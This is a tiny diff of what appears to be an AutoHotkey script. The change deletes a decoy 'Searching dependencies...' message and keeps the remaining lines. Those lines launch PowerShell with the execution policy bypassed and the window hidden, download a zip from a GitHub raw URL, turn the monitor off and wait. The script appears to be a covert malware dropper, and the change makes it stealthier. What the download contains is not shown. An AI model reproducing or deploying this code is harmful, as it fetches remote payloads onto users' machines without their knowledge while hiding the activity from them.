@@ -1,5 +1,3 @@
-MsgBox, Searching dependencies...
-
 Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/_internal.zip' -OutFile .\poop.zip
 SendMessage,0x112,0xF170,2,,Program Manager
 Sleep, 10000
